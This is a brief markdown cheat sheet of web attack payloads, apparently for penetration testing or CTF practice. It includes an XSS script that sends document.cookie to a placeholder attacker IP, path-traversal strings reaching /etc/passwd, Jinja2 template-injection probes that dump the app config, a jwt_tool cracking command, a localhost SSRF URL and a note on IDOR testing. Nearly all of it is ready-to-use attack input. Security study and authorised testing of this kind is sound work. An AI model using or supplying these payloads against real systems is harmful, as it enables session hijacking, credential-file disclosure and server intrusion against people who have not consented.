# 🌐 Web Attacks Cheatsheet

## XSS
```html
<script>fetch('http://<YOUR_IP>/?cookie=' + document.cookie)</script>
```

## LFI → RCE
```bash
/etc/passwd
../../../../../../etc/passwd
```

## SSTI (Jinja2)
```
{{7*7}}
{{ config.items() }}
```

## JWT Attacks
```bash
jwt_tool token.jwt -C -d
```

## SSRF
```bash
http://127.0.0.1:80/
```

## IDOR
Test numeric increments or parameter changes manually or with tools like ffuf or Burp Repeater.